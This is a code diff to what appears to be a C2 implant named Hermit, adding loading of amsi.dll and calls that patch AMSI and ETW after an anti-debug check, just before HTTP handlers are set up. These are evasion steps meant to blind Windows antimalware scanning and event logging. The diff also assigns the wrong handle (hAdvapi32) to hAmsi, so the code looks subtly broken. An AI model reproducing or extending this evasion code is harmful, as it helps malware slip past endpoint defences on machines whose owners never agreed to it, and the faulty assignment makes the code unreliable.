@@ -70,6 +70,14 @@ namespace Hermit
 		}
 		pModules->hAdvapi32 = hAdvapi32;
 
+		WCHAR wAmsi[] = L"amsi.dll";
+		HMODULE hAmsi = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wAmsi);
+		if (!hAmsi)
+		{
+			return;
+		}
+		pModules->hAmsi = hAdvapi32;
+
 		WCHAR wBcrypt[] = L"bcrypt.dll";
 		HMODULE hBcrypt = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wBcrypt);
 		if (!hBcrypt)
@@ -146,6 +154,7 @@ namespace Hermit
 		Procs::FindProcsMisc(
 			pProcs,
 			hAdvapi32,
+			hAmsi,
 			hBcrypt,
 			hCrypt32,
 			hDbghelp,
@@ -190,11 +199,17 @@ namespace Hermit
 		// Anti-Debug
 		// --------------------------------------------------------------------------
 
-		// Anti-Debug
 		if (bAntiDebug)
 		{
 			Technique::AntiDebug::StopIfDebug(pState->pProcs);
 		}
+
+		// --------------------------------------------------------------------------
+		// AMSI & ETW Bypass
+		// --------------------------------------------------------------------------
+
+		Technique::AmsiBypass::PatchAmsi(pState->pProcs);
+		Technique::EtwBypass::PatchEtw(pState->pProcs);
 
 		// --------------------------------------------------------------------------
 		// Get initial info and http handlers.
